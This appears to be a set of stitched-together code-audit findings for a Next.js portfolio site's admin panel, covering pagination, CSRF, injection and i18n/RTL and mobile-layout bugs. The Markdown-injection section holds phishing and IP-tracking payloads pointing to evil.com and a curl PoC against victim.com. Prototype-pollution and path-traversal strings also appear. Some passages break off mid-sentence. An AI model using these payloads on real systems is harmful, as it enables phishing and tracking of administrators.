  page.tsx:407  fetch("/api/admin/clear",    { ..., credentials: "include" }) // delete

All three backend routes call checkAdminAuth(req, password) which
delegates to getSessionFromRequest(request) (admin-auth.ts:20, 9)
— cookie-based session. credentials: 'include' is therefore
mandatory and correctly applied everywhere.

No `password` query/body param is sent by the panel. This is
consistent with the V17.2 cookie-only auth model
(admin-auth.ts:4-6) — the `password` arg in checkAdminAuth is a
no-op retained only for backward compatibility (admin-auth.ts:18).

#10. Pagination?  —  FAIL / HIGH
----------------------------------------------------------------
Location: src/app/user-dashboard/page.tsx:365-377 (load), 450-500 (render)
         src/app/api/messages/route.ts:20-28 (backend cap)

Backend query — /api/messages/route.ts:20-28:
  db.contactMessage.findMany({
    orderBy: { createdAt: "desc" },
    take: 100,                                                     // :22  ← HARD CAP
    include: { replies: ..., notes: ..., tags: ... },
  })

Panel fetch — page.tsx:366:
  fetch("/api/messages", { credentials: "include" })
  //  ↑ NO ?page=, NO ?limit=, NO ?cursor=, NO ?offset=

Panel render — page.tsx:450-500:
  <div className="dashboard-messages-list">
    {messages?.map(msg => (<div key={msg.id} className="dashboard-message-card">...</div>))}
  </div>
  //  ↑ NO pagination controls, NO "Load more" button, NO infinite scroll,
  //    NO "Showing X of Y" count

Findings:
  (a) FAIL — NO client-side pagination UI. The panel renders every
      message returned by the API in a single `.map()` with no
      chunking, no virtualization, no "show more" affordance.

  (b) FAIL — NO server-side pagination request. The panel sends no
      query params to /api/messages. The backend ignores any such
      params anyway (route.ts:11-17 only reads `password`).

  (c) FAIL — SILENT DATA TRUNCATION — route.ts:22 `take: 100`
      The backend returns AT MOST 100 messages (most recent first,
      ordered by createdAt desc). If the DB has >100 contact
      messages, the OLDEST N-100 are silently dropped from the
      response. The panel has NO way to know this happened:
        - No `total` count is returned by the API.
        - No `hasMore` flag is returned.
        - The `stats.contactMessages` field (route.ts:42) is set to
          `messages.length` — i.e. the COUNT OF RETURNED ROWS, not
          the total DB count. So even the stats object lies (it
          reports "47 contact messages" when there are actually
          147 in the DB and 100 were returned — wait, in that
          case stats would say "100" but the admin wouldn't know
          47 more exist).

      This is a DATA LOSS / COMPLIANCE issue for a contact-form
      inbox: legitimate customer inquiries older than the 100th
      most-recent are INVISIBLE to the admin with no indication.
      They remain in the DB (not deleted) but are unreachable via
      this UI. The only way to surface them would be direct DB
      access or a separate admin tool.

  (d) FAIL — No "Load more" / "Next page" button anywhere in the
      render (page.tsx:435-503). The `<div className="dashboard-
      messages-list">` at :450 is the only list container and it
      contains only the `.map()` output.

  (e) FAIL — Backend has no pagination support at all:
        - route.ts:9 GET handler signature: `GET(req: Request)`
        - route.ts:11-12 only reads `password` from URL search
          params. No `page`, `limit`, `cursor`, `offset`.
        - route.ts:20-28 Prisma query has hardcoded `take: 100`
          and NO `skip` / `cursor`. Even if the client sent
          `?page=2`, the backend would ignore it and return the
          same first 100.
      So pagination is not merely missing from the UI — it is
      missing end-to-end. Adding UI pagination alone would NOT
      work without backend changes.

  (f) PERFORMANCE — rendering 100 message cards (each potentially
      with multiple replies) without virtualization is borderline.
      Not a correctness bug, but the panel will feel sluggish on
      lower-end devices when the inbox is near the 100-row cap.
      No `React.memo`, no windowing, no lazy rendering of replies.

================================================================
ADDITIONAL OBSERVATIONS (not in the 10 questions but relevant)
================================================================

----- F-A. Reply form is shared across all messages  [MED, UX bug] -----
Location: src/app/user-dashboard/page.tsx:361-362, 474, 482-497

  const [replyingTo, setReplyingTo] = useState<string | null>(null); // :361
  const [replyText, setReplyText] = useState("");                  // :362

  // Reply button on each message card:
  onClick={() => { setReplyingTo(msg.id); setReplyText(""); }}      // :474

  // Reply form rendered only for the active replyingTo card:
  {replyingTo === msg.id && (
    <div className="dashboard-reply-form">
      <textarea value={replyText} onChange={e => setReplyText(e.target.value)} ... />
      ...
    </div>
  )}

Analysis:
  - Only ONE reply form is open at a time (state is a single
    `replyingTo: string | null`). Good — prevents multiple open
    forms.
  - BUT: `replyText` is a SINGLE shared string. If the admin starts
    typing a reply to message A, then clicks "Reply" on message B
    (page.tsx:474), `setReplyingTo(B.id)` AND `setReplyText("")`
    fire. The text the admin typed for message A is SILENTLY
    DISCARDED. No "discard your draft?" confirmation. No draft
    preservation per-message.
  - Compare with deleteMessage's `confirm()` dialog (page.tsx:405)
    — reply drafts get LESS protection than deletes.

----- F-B. Replying to a deleted message  [LOW, race condition] -----
Location: page.tsx:379-402 vs page.tsx:404-422

Analysis:
  - Admin A opens reply form for message X (setReplyingTo(X.id)).
  - Admin B (in another tab/window) deletes message X via
    /api/admin/clear.
  - Admin A types reply and clicks Send → POST /api/admin/reply
    with { messageId: X.id, reply: ... }.
  - Backend /api/admin/reply route.ts:35-41 does
    `db.contactMessage.findUnique({ where: { id: messageId } })`
    and returns 404 "message_not_found" if not found.
  - Panel receives { ok: false, error: "message_not_found" } →
    setError("message_not_found") at page.tsx:397.

----- F-C. No XSS risk in message rendering  [PASS, informational] -----
Location: page.tsx:455-462, 466-467

Analysis:

    rendered as plain text children of React elements (not via
    dangerouslySetInnerHTML). React escapes by default.
  - `msg.createdAt` is passed to `new Date().toLocaleString()`
    (page.tsx:459) — if msg.createdAt were a malicious string,
    `new Date("...")` would return Invalid Date and toLocaleString

  - No markdown / HTML rendering anywhere in the panel. PASS.

----- F-D. No CSRF token  [LOW, accepted pattern] -----
Location: page.tsx:382-387, 407-412 (and all POST calls)

Analysis:
  - POST requests rely solely on the session cookie
    (credentials: 'include' + cookie SameSite). No X-CSRF-Token
    header, no double-submit cookie, no CSRF token in body.
  - SameSite=Lax (default) on the session cookie
    (login/route.ts:118 sets `sameSite: "lax"` per prior audit
    V17.5-SEC-18 F-F context) provides partial CSRF protection —
    POST from a third-party site is blocked by the browser because
    the cookie won't be sent on cross-site POST with non-idempotent
    method under Lax. So this is ACCEPTED PRACTICE for this
    codebase, not a defect.
  - Note: if the cookie's SameSite were ever changed to "None",
    these endpoints would become CSRF-vulnerable. Current setting
    is safe.

    NOT pollute global `Object.prototype`. Prisma iterates own
    enumerable props, treats `__proto__` as unknown field, errors.

    merge found** (grep returned no matches). Spread-only patterns

Status: PARTIAL  | Severity: MED (Markdown injection in Bale/Telegram)

  --- 10.1 Server-side template literals — PASS ---
    - No `eval()`, no `new Function()`, no `vm.runInNewContext()` in

    - `dangerouslySetInnerHTML` uses:

        Sanitizer validates URL host against allowlist (aparat.com /
        youtube.com / youtu.be / player.vimeo.com) via
        `new URL(src)` + `ALLOWED_DOMAINS.includes(url.hostname)`.
        `javascript:` / `data:` rejected (empty hostname). No
        attribute breakout (regex captures `[^"']*` so src can't
        contain `"` or `'`).
      - src/app/clips/page.tsx:57 — same sanitizeEmbed. ✅ Safe.
    - `document.body.innerHTML = \`<div>...</div>\`` at
      src/app/page.tsx:147 — hardcoded HTML string. ✅ Safe.
    - RSS XML template at src/app/rss.xml/route.ts:18-36 — admin-
      controlled fields (`a.titleEn`, `a.summaryEn`, `a.typeEn`)
      escaped via `escapeXml()` (line 19, 21, 22). `a.id` is Prisma
      cuid (auto-generated, not admin-controlled). `a.date` is
      interpolated into `new Date(a.date + "-01").toUTCString()`
      (line 23) — output is always a valid date string or the
      literal string `"Invalid Date"`. No XML injection possible.

  --- 10.2 Markdown injection in Bale/Telegram — MED ---
  Locations:
    - src/lib/bale.ts:55 — `parse_mode: "Markdown"` (sendMessage
      body).
    - src/lib/bale.ts:73-83 (notifyNewContactMessage) —
        `*From:* ${msg.name}`,
        `*Email:* ${msg.email}`,
        `*ID:* \`${msg.id}\``,
        `${msg.message.slice(0, 500)}`
      where `msg.name/email/message` are visitor-supplied via
      /api/contact POST (src/app/api/contact/route.ts:159-167
      stores them, then bale.ts:164-168 fires notifyNewContact-
      Message with the raw `name/email/message`).
    - src/lib/bale.ts:94-103 (notifyNewChat) —
        `*Visitor:* ${msg.visitorId}`,
        `*Session:* \`${msg.sessionId}\``,
        `${msg.message.slice(0, 300)}`
      where `msg.visitorId` is visitor-supplied via /api/chat POST
      body (src/app/api/chat/route.ts:101 —
      `String(body.visitorId || "").slice(0, 100) || "anon"`).
    - src/lib/telegram.ts:30, 43-49, 56-62 — identical pattern.
    - src/lib/bale.ts:127, 141, 148, 161, 170, 200-208, 220-225 —
      admin responses from processBaleWebhook are also sent via
      sendBaleMessage with parse_mode Markdown. Admin-controlled
      responses could inject Markdown back into admin's own chat
      (self-XSS-equivalent).

  Issue:
    - Bale/Telegram render Markdown in chat. Attacker-supplied
      `visitorId` / `name` / `email` / `message` is interpolated
      verbatim.
    - Markdown injection vectors:
      (a) `[evil-label](http://evil.com/phish)` — clickable link
          in admin's Bale/Tg chat labelled arbitrarily. Phishing.
      (b) `` `[evil](http://evil.com)` `` — code-block escape.
      (c) `![alt](http://evil.com/track.png?visitorId=foo)` —
          image tag → admin's Bale client makes HTTP request to
          attacker server → IP exfiltration of admin's Bale client.
      (d) Nested formatting chars break the message layout (DoS).
      (e) `*Visitor:* ${msg.visitorId}` — if visitorId starts
          with `*`, becomes `**Visitor:** ...` → bold confusion.
    - `msg.sessionId` is wrapped in backticks (`\`${msg.sessionId}\``)
      so it's code-formatted — safer. But sessionId is also
      attacker-supplied (chat route line 102 — `String(body.sessionId
      || "").slice(0, 100)`); a sessionId containing a backtick
      breaks the code block.

  PoC:
    curl -X POST https://victim.com/api/chat \
      -H "Content-Type: application/json" \
      -d '{"message":"hi","lang":"en",
           "visitorId":"[CEO Ehsan](http://evil.com/phish)"}'
    # Admin's Bale/Tg chat shows:
    #   🤖 *New Chat Session*
    #   *Visitor:* CEO Ehsan   ← clickable link to evil.com
    #   *Session:* `clxxxx...`
    #   hi

  Cross-ref: V17.4-SEC-12 Q10 raised this to MED. This audit
  confirms and adds the image-tag IP-exfiltration vector (c) above
  and the backtick-escape vector (e).

ADDITIONAL FINDINGS (not in the 10 classes but observed)
================================================================

  --- F-A. Visitor-supplied body.message type not validated ---
  Location: src/app/api/contact/route.ts:77-79
    `const name = String(body.name || "").trim().slice(0, 100);`
    `const email = String(body.email || "").trim().slice(0, 200);`
    `const message = String(body.message || "").trim().slice(0, 5000);`
  Issue: `String(body.name || "")` coerces non-string body values to
    string. If attacker sends `{"name": {"__proto__": {...}}}` →
    `body.name` is an object → `body.name || ""` returns the object
    (truthy) → `String({...})` returns `"[object Object]"`. Stored
    as that string. Not injection per se, but visitorId / name /
    email fields accept arbitrary types silently. LOW.

  --- F-B. /api/track accepts untyped body.referrer / body.lang ---
  Location: src/app/api/track/route.ts:23-24
    `referrer: body.referrer || null,`
    `lang: body.lang || null,`
  Issue: `body.referrer` is not coerced to string. If attacker POSTs
    `{"path":"/","referrer":{"$ne":null}}`, the object is passed to
    Prisma `create({ data: { referrer: {...} } })`. Prisma will
    coerce / reject. In SQLite + Prisma, non-scalar values cause a
    PrismaClientValidationError → 500. Could be used for DoS by
    sending malformed types repeatedly. Bypasses the rate-limit on
    /api/track? — /api/track is NOT in middleware's RATE_LIMIT_PATHS
    (middleware.ts:21 — only /api/user/login, /api/contact, /api/chat
    are listed). Unauthenticated DoS amplifier. MED.

  --- F-C. /api/admin/email route "set_email" accepts any string with @ ---
  Location: src/app/api/admin/email/route.ts:49
    `if (!email || !email.includes("@")) { return 400; }`
  Issue: Only check is presence of `@`. Admin can set forwardEmail
    to `x/../../../etc/passwd@y` — path-traversal in URL (see §5.2).
    LOW (admin-gated, formsubmit.co host only).

  --- F-D. Dead `password` query param still read in 8 admin routes ---
  Locations:
    - src/app/api/admin/equipment/route.ts:13, 47
    - src/app/api/admin/security-dashboard/route.ts:12, 51
    - src/app/api/admin/stats/route.ts:8
    - src/app/api/admin/nav/route.ts:9, 26
    - src/app/api/admin/text/route.ts:16, 46
    - src/app/api/admin/settings/route.ts:102
    - src/app/api/admin/content/route.ts:17, 56
    - src/app/api/admin/email/route.ts:23, 39
    - src/app/api/admin/providers/route.ts:13, 50
    - src/app/api/admin/themes/route.ts:13, 38
    - src/app/api/admin/security/route.ts:18, 44
    - src/app/api/messages/route.ts:12, 65
    - src/app/api/chat/route.ts:234
  Issue: `url.searchParams.get("password")` is read into a local
    `password` variable, passed to `checkAdminAuth(req, password)`,
    which (per src/lib/admin-auth.ts:17 — `checkAdminAuth(request,
    _password?: string)`) IGNORES the second parameter (renamed
    `_password`). The admin password backdoor was removed in V17.2
    per the file header comment, but the dead read+pass code
    remains. Informational: any admin who still sends `?password=
    xxx` leaks their (now-unused) password into NGINX / Vercel
    access logs. LOW / informational. Cross-ref: V17.4-SEC-12 F-D
    flagged this for /api/chat only; this audit finds 13 routes
    total.

  --- F-E. Dead `password` body field in 9 admin POST routes ---
  Same pattern as F-D but for POST body:
    - equipment route line 47, content route line 56, nav route
      line 26, text route line 46, settings route line 21, email
      route line 39, providers route line 50, themes route line 38,
      security route line 44, messages route line 65, chat-reply
      route line 19, reply route line 20, clear route line 16,
      security-dashboard route line 51.
  All ignored by `checkAdminAuth`. Same informational concern.

  --- F-F. JSON.parse output returned to public API without type check ---
  Location: src/app/api/content/route.ts:51-52
    `try { return JSON.parse(e.specs); } catch { return null; }`
  Issue: Parsed `specs` is `any`. If admin stores a JSON-encoded
    string like `"\"<script>alert(1)</script>\""`, the public
    /api/content GET returns `specs: "<script>alert(1)</script>"`
    (a JSON string). Frontend code in LabEquipmentRack.tsx renders
    `e.specs` — React escapes by default, BUT if any component
    uses `dangerouslySetInnerHTML` on `e.specs`, stored XSS.
    LabEquipmentRack.tsx inspected — no `dangerouslySetInnerHTML`
    found. However, the untyped shape is a footgun. LOW (defense-
    in-depth).

  --- F-G. /api/admin/clear "message_all" / "chat_all" no confirmation ---
  Location: src/app/api/admin/clear/route.ts:33-37, 50-57
  Issue: `deleteMany({})` deletes ALL rows. Single admin POST
    request with `target: "chat_all"` wipes entire ChatSession +
    ChatMessage tables. No secondary confirmation, no soft-delete.
    Not injection per se, but if admin session is hijacked (per
    V17.4-SEC-12 Q1 session-hijack risk), full data destruction
    in one request. LOW (operational risk, not injection).

Q1. Panel language switcher changes all UI text?
================================================================
Status: PARTIAL  | Severity: HIGH

Two SEPARATE language switchers exist:

A) PUBLIC SITE switcher (src/app/page.tsx:522-533): 3 buttons (EN/DE/FA).
   - Calls setLang(l) which only updates local React state.
   - Affects: homepage UI strings (UI[lang] in content.ts), TextEditor
     doesn't use it, ChatSection uses it, InteractiveTerminal uses it.
   - DOES NOT persist to localStorage.

B) PANEL switcher (src/app/user-dashboard/page.tsx:185-194 dropdown):
   - Calls switchLang(newLang) (line 115-120) which:
     * Updates `lang` state (passed down to child components)
     * Writes localStorage.panel_lang
     * Sets document.documentElement.lang + dir
   - The SettingsPanel.tsx:271-291 has its OWN redundant switcher doing
     the same thing (also writing localStorage.panel_lang).
   - HOWEVER: SettingsPanel is rendered WITHOUT a lang prop
     (user-dashboard.tsx:347: <SettingsPanel />). It reads its OWN
     internal panelLang state from localStorage on mount — so it's

Q2. RTL applied when fa?
================================================================
Status: PARTIAL  | Severity: HIGH

RTL is APPLIED at the <html> attribute level when lang==="fa":

  - layout.tsx:112: server-rendered `<html lang="en" dir="ltr">`
    (hardcoded en/ltr — pre-hydration)
  - page.tsx:110-113: client effect sets
    document.documentElement.lang = lang; dir = tt.dir
    (tt.dir = "rtl" when lang==="fa", from content.ts:529)
  - user-dashboard/page.tsx:96, 119: sets dir based on panelLang
  - SettingsPanel.tsx:276, 290, 566: sets dir on settings-root
    div based on panelLang === "fa"

BUT — RTL CSS handling is minimal. personal.css has only 7 narrow
`html[dir="rtl"]` overrides:

  - :184 html[dir="rtl"] body { font-family: var(--font-fa) }
  - :1408 html[dir="rtl"] .nav-links { direction: rtl }
  - :1409 html[dir="rtl"] .about-stats li::before { left: auto;
            right: 0 } (flip bullet)
  - :1410 html[dir="rtl"] .skill-card::before { right: auto;
            left: 12px }
  - :1411 html[dir="rtl"] .book-cover::after { left: auto;
            right: 8px }
  - :1412 html[dir="rtl"] .footer-admin { direction: ltr }
  - :1414-1420 mobile nav-links RTL positioning
  - :3461-3464 html[dir="rtl"] .dashboard-header / .dashboard-actions /
            .dashboard-message-actions { flex-direction: row-reverse }

EVERYTHING ELSE has no RTL handling. Specifically, these major
components DO NOT flip:

  - .statusbar, .statusbar-left, .statusbar-right (page.tsx:441-465)
  - .navbar / .nav-inner / .nav-right / .lang-toggle / .theme-switcher
    (page.tsx:468-543)
  - .hero-grid / .hero-text / .hero-visual (page.tsx:547-579)
  - .about-grid / .about-stats / .about-card (page.tsx:588-608)
  - .skills-grid / .skill-card (page.tsx:627-641)
  - .books-grid / .book-card / .book-cover / .book-body (ArchiveGrid)
  - .articles-list / .article-row (ArchiveGrid)
  - .tutorials-grid / .tutorial-card (ArchiveGrid)
  - .chat-window / .chat-bar / .chat-body / .chat-msg-user /
    .chat-input-row / .chat-prompt (ChatSection)
  - .contact-grid / .contact-form / .field / form inputs
  - .equipment-rack / .equipment-grid / .equipment-item
  - .tutorial-modal / .tutorial-modal-inner / .tutorial-modal-bar
  - .to-top button (page.tsx:835-841)
  - .footer / .footer-inner / .footer-links
  - .admin-message / .admin-reply-box / .admin-search / .admin-tabs
  - .settings-root / .settings-card / .settings-row / .settings-field

Q7. Language persists across refresh?
================================================================
Status: FAIL  | Severity: HIGH

  ❌ PUBLIC SITE: language does NOT persist.
     - page.tsx:55: `const [lang, setLang] = useState<Lang>(DEFAULT_LANG);`
       No useEffect on mount reads from localStorage.
     - The lang-toggle buttons (page.tsx:522-533) only call setLang.
     - Grep for `localStorage` in page.tsx returns only:
         line 117: localStorage.getItem("portfolio_theme")
         line 123: localStorage.setItem("portfolio_theme", theme)
       No "lang" / "site_lang" / "panel_lang" key is read or written
       for the public homepage.
     - Effect: visitor selects "FA" → page reloads (or refresh) →
       page renders with DEFAULT_LANG="en" (content.ts:9). All UI
       strings flip back to English. Worse: document.documentElement
       .lang/dir are set in a useEffect (page.tsx:110-113) AFTER
       hydration — so even the first paint is LTR/English.

  ✅ ADMIN PANEL: language DOES persist.
     - user-dashboard/page.tsx:93: `localStorage.getItem("panel_lang")`
       loaded on mount.
     - user-dashboard.tsx:117: `localStorage.setItem("panel_lang",
       newLang)`.
     - SettingsPanel.tsx:273: `localStorage.getItem("panel_lang")`.
     - SettingsPanel.tsx:288: `localStorage.setItem("panel_lang",
       lang)`.
     - However: SettingsPanel ALSO mutates document.documentElement
       .lang/.dir (lines 275-276, 289-290) when it mounts — meaning
       if admin sets panel_lang=fa in the dashboard, then navigates
       to the public homepage "/", the SettingsPanel's effect has
       already set <html lang="fa" dir="rtl"> but the homepage
       useState is still DEFAULT_LANG="en" → MISMATCH:
         - <html lang="fa" dir="rtl"> (from panel effect)
         - but tt = UI["en"] (homepage state)
         - The hero text will be English while the document direction
           is RTL. Confusing UX.

  Cross-reference: layout.tsx:112 server-rendered `<html lang="en"
    dir="ltr" suppressHydrationWarning>`. The suppressHydrationWarning
    hides the mismatch but doesn't fix it.

Q9. Logical property issues?
================================================================
Status: FAIL  | Severity: MED

  The codebase overwhelmingly uses PHYSICAL properties (left,
  right, margin-left, margin-right, border-left, border-right,
  padding-left, padding-right, text-align:left|right). Logical
  properties are used in only 3 places in personal.css:

    - line 2819: `padding-inline-start: 20px`
    - line 3391: `margin-inline-start: 8px`
    - line 3410: `border-inline-start: 2px solid var(--green-dim,
      #008f11)`

  No use of:
    - `inset-inline-start` / `inset-inline-end`
    - `margin-block-start` / `margin-block-end`
    - `padding-block-start` / `padding-block-end`
    - `border-block-start` / `border-block-end`
    - `text-align: start` / `text-align: end`
    - `inset-inline` (shorthand)
    - `:dir(rtl)` CSS pseudo-class (would simplify overrides)

  Grep results: ~60+ occurrences of `padding-left`/`padding-right`/
  `margin-left`/`margin-right`/`text-align:left|right`/`border-left`/
  `border-right`/`left:\d`/`right:\d` in personal.css (see audit
  raw output). NONE of these are paired with logical-property
  equivalents, and very few are flipped via `html[dir="rtl"]`
  selectors (only 7 such selectors in the entire file).

  Inline styles in components also use physical properties:
    - TextEditor.tsx:120-138, 144-152, 156-167 (no inline-start/end)
    - ContentManager.tsx:193-260 (uses marginLeft, padding, etc.)
    - ThemeBuilder.tsx:155-170, 196-235
    - AparatClipManager.tsx:128-219 (uses marginLeft, marginRight)
    - SettingsPanel.tsx (uses dir="ltr" on individual inputs —
      partially mitigates)
    - LabEquipmentRack.tsx:54, 56-64 (inline flex, no RTL flip)

  Practical impact: in RTL mode, ~85% of the layout will be
  visually misaligned. Browsers do auto-flip for `dir="rtl"` on
  inline content (text direction) but NOT for physical CSS
  properties like `left`, `right`, `padding-left`, etc.

    ⚠ NO server-side enforcement that LLM actually replies in
       the requested language — system prompt is a hint. If the
       provider ignores it (e.g., Ollama with a small model), the
       Persian visitor receives English. No post-processing /

    ⚠ Server stores raw user message (line 146-148) and raw LLM
       reply (line 204-206) — no translation on storage. If

    ✅ Greeting message (line 36-40): localized per Lang.
    ✅ chatLabel (line 131-135): title/sub/callsign/status/ph/

    ✅ Error messages (line 113-114): localized per Lang (rate-

    ✅ User/assistant author label (line 161): fa/de/en.
    ✅ Visitor sends body.lang (line 96) — server uses it.

    ❌ ChatSection IGNORES the server's localized `message` field

       with `message: "چت موقتاً غیرفعال است..."`, the client
       treats it as a generic error and shows "... Error. Try
       again." instead of the localized message.
       Code path:
         - ChatSection.tsx:101: `if (res.ok && data.ok)` — fails
           on 503.
         - line 110-114: looks at `data.error` (which is undefined
           on 503 since server returns `error: "api_disabled"` —
           actually the server DOES return `error: undefined` and
           `message: ...`, so `err = data.error || "server_error"`
           → `err = "server_error"` → matches neither "rate_limit"
           → falls to default `errs.server`-equivalent which in

================================================================
ADDITIONAL FINDINGS (not in the 10 questions but observed)
================================================================

----- F-A. Two parallel language systems diverge  [HIGH] -----
  Location: src/app/page.tsx:55 (public useState) vs
            src/app/user-dashboard/page.tsx:93 (panel localStorage
            read) vs src/components/SettingsPanel.tsx:273
            (panel localStorage read).

  Analysis:
  - The public homepage uses a non-persistent `lang` state.
  - The admin panel uses localStorage.panel_lang.
  - SettingsPanel.tsx mounts on the dashboard and immediately
    sets document.documentElement.lang/dir based on panel_lang —
    overriding any prior state.
  - If an admin navigates from the dashboard (panel_lang=fa, RTL)
    to the public "/" (which renders with DEFAULT_LANG="en"), the
    <html> tag is set to fa/rtl by the dashboard's lingering
    effect, but the homepage's React state is en/LTR. The page
    content (UI strings) is English but the document direction is
    RTL. This breaks layout until the visitor manually clicks the
    EN button on the homepage (which only updates state, not
    localStorage — so refresh re-breaks).

----- F-B. Persian text in code comments is fine but in error
        paths it's user-facing  [LOW] -----
  Many catch blocks and console.error messages include Persian
  text (e.g., user-login.tsx:46 "ارتباط با سرور برقرار نشد.").
  This is intentional for the Persian-default audience, but the
  strings are not in any translation table — they're inline. If
  the panel language is en/de, these still appear in Persian.

----- F-C. Vazirmatn font loads for all langs but only declared
        for rtl body  [LOW] -----
  layout.tsx:12-16 declares Vazirmatn (Persian font) as a CSS
  variable --font-vazirmatn, and personal.css:184 applies it to
  body only when html[dir="rtl"]. The latin fonts (Geist, Inter,
  Lora, Fira Code) load for LTR. This is correct but means Persian
  text in LTR mode (e.g., Persian nav item label rendered while
  lang="en") renders in the LTR font (Geist) which may not have
  Persian glyphs → falls back to system Persian font. Visual
  inconsistency.

----- F-D. metadata.locale is hardcoded fa_IR  [LOW] -----
  layout.tsx:42: `locale: "fa_IR"` and :43 `alternateLocale: ["en_US",
  "de_DE"]`. The default Open Graph locale is Persian even though
  DEFAULT_LANG = "en". This affects social-media share previews —
  Facebook/Twitter may render the share card RTL. Should match
  DEFAULT_LANG or be derived from a per-route lang param.

----- F-E. <html lang="en" dir="ltr"> in layout is server-rendered
        before hydration  [LOW] -----
  layout.tsx:112. With suppressHydrationWarning on <html> and
  <body>, React ignores the mismatch — but search engines and
  screen readers see lang="en" dir="ltr" until the client effect
  runs (page.tsx:110-113). For Persian visitors on slow
  connections, the initial server-rendered HTML declares English/
  LTR — bad for SEO and a11y. Should read lang from cookie /
  Accept-Language header in middleware.

----- F-F. No middleware-level locale routing  [LOW] -----
  src/middleware.ts exists but does not handle /en /de /fa routes
  or set a lang cookie. All language selection is client-side.
  This means:
    - URL is the same regardless of language (no /fa/ prefix).
    - SEO: search engines see one URL serving mixed-language
      content (server-rendered en + client-flipped fa).
    - Sharing a URL in Persian doesn't preserve the language for
      the recipient.

----- F-G. SettingsPanel duplicates the language switcher UI  [LOW] -----
  Both user-dashboard.tsx:185-194 (dropdown in dashboard header)
  and SettingsPanel.tsx:579-587 (dropdown in settings card) let
  the admin change panel_lang. They both write to the same
  localStorage key, but if the admin changes one, the other
  component's local state is NOT updated (no sync between the two
  useState hooks). The dropdown in the dashboard header will
  still show the OLD value until the dashboard re-mounts.

----- F-H. user-dashboard DAY_NAMES is hardcoded Persian  [LOW] -----
  user-dashboard/page.tsx:37: `const DAY_NAMES = ["یکشنبه",
  "دوشنبه", "سه‌شنبه", "چهارشنبه", "پنجشنبه", "جمعه", "شنبه"];`
  Used at line 157 to format `user.allowedDays`. If panel_lang is
  en/de, the day names are still Persian. (Also duplicated in
  AccessUserManager.tsx:46-54 — same hardcoded Persian array.)
  Should be a localized lookup based on panel_lang.

----- F-I. useContent cache invalidation is aggressive  [LOW,
        unrelated to i18n] -----
  useContent.ts:38-39 unconditionally deletes
  "site_content_cache" and "site_content_cache_time" on every
  mount. Combined with `lang` in the dependency array (line 69),
  every language change re-fetches /api/content. Not a bug, but
  means switching language on the public homepage triggers a full
  content re-fetch every time (no caching).

----- F-J. ArchiveGrid search doesn't include German fields  [LOW] -----
  ArchiveGrid.tsx:36-43 filter checks titleEn, titleFa, descEn,
  descFa, venueEn, publisherEn — no De fields. A German visitor
  searching for a German title won't find it.

================================================================
SUMMARY
================================================================
  - Only Q5 (TextEditor saves all 3 langs) PASSES cleanly.
  - Q1, Q2, Q6 are PARTIAL — the architecture supports i18n (UI
    table in content.ts, useContent helper, tx() fallback), but
    execution is incomplete across components.
  - Q3, Q4, Q7, Q8, Q9, Q10 FAIL — significant hardcoded strings,
    no public-site lang persistence, physical-property layout bugs
    in RTL, near-zero logical-property usage, partial chat
    translation enforcement.
  - The two highest-impact bugs for end users:
      1. Public homepage lang is NOT persisted (Q7) — every refresh
         reverts to English.
      2. ArchiveGrid ignores `lang` for DB content (Q6) — Persian
         visitor sees English titles for books/articles/tutorials.
  - The two highest-impact bugs for admins:
      1. AccessUserManager, AparatClipManager, FontSelector,
         ContentManager field labels are NOT localized at all —
         admin must read Persian (or English) regardless of panel
         language preference (Q1, Q3, Q4).
      2. SettingsPanel has 9+ places with `panelLang === "fa" ?
         ... : ...` (no de branch), so German admin sees English
         fallback throughout the settings forms (Q1).

Q1. Admin panel on mobile <600px?
----------------------------------------------------------------
Status: PARTIAL FAIL  | Severity: HIGH

The admin panel is the /user-dashboard route (src/app/user-dashboard/
page.tsx). At <600px the SHELL is responsive, but several child
components render FIXED multi-column grids with NO media query,
forcing their content to be squeezed into narrow columns and
creating touch-targets well below 44px (see Q4).

Responsive shell (✓ works):
  - .dashboard-shell   @media(max-width:768px) padding:8px
    personal.css:3111-3115
  - .dashboard-container @media(max-width:768px) padding:16px
    personal.css:3127-3131
  - .dashboard-tabs   @media(max-width:768px) overflow-x:auto
    personal.css:3241-3247
  - .dashboard-info-grid @media(max-width:600px) 1fr
    personal.css:3287-3291
  - .settings-row     @media(max-width:600px) 1fr
    personal.css:2833-2837

GAPS — fixed multi-col inline grids with NO mobile breakpoint:

  1. ThemeBuilder.tsx:135-140 (editor)
       style={{ gridTemplateColumns: "1fr 1fr", gap: 16 }}
       Two columns: color inputs + live preview.
       On a 360px phone (16px container × 2 = 328px usable, minus
       24px dashboard padding × 2 = 280px), each column gets ~140px.
       The color row (line 154-170) puts a 30px color picker + 80px
       label + flex-1 hex input = ~140px → hex input gets ~30px.
       Unusable. NO media query.

  2. TextEditor.tsx:113-154 (EN/FA/DE textareas)
       style={{ gridTemplateColumns: "1fr 1fr 1fr", gap: 6 }}
       Three columns side-by-side.
       On 360px phone → each textarea ~108px wide.
       At fontSize 0.72rem with monospace, fits ~15 chars/line.
       Editing Persian text in a 108px-wide box is painful.
       NO media query.

  3. NavMenuManager.tsx:99 (label EN/FA/DE inputs)
       style={{ gridTemplateColumns: "1fr 1fr 1fr", gap: 8 }}
       Same 3-col squeeze. NO media query.

  4. NavMenuManager.tsx:104 (link + target)
       style={{ gridTemplateColumns: "2fr 1fr", gap: 8 }}
       On narrow phones, the URL input + select target get squeezed.
       NO media query.

  5. SecurityDashboard.tsx:66 (stat cards)
       style={{ gridTemplateColumns: "repeat(4, 1fr)", gap: 10 }}
       FOUR stat cards in a row.
       On 360px phone → each card ~80px wide.
       Inner: <div fontSize=1.6rem fontWeight=700>{value}</div>
       A 4-digit number (e.g. "1234") at 1.6rem = ~26px wide → fits
       but barely. 5-digit values overflow.
       NO media query.

  6. AccessUserManager.tsx:335 (hour start/end)
       style={{ gridTemplateColumns: "1fr 1fr", gap: 14 }}
       Two number inputs side-by-side. NO media query.
       Acceptable on 360px phones (each ~150px) but tight.

  7. AparatClipManager.tsx:180 (category/order)
       style={{ gridTemplateColumns: "1fr 1fr", gap: 14 }}
       Same pattern. NO media query. Acceptable.

  8. FontSelector.tsx:48 (5 font buttons)
       style={{ gridTemplateColumns: "1fr 1fr", gap: 10 }}
       5 buttons in a 2-col grid → 3 rows. NO media query.
       Each button padding 12px → ~50px tall ✓ adequate.
       Acceptable on mobile.

  9. NavMenuManager.tsx:119 (item row)
       style={{ display: "flex", align-items: center,
                justify-content: space-between", gap: 8 }}
       Label section has flex:1; actions div is fixed.
       On narrow phones, label may wrap to 2-3 lines, pushing
       row height. Actions div has 5 buttons gap:4 → ~175px total.
       Acceptable but row grows tall on mobile.

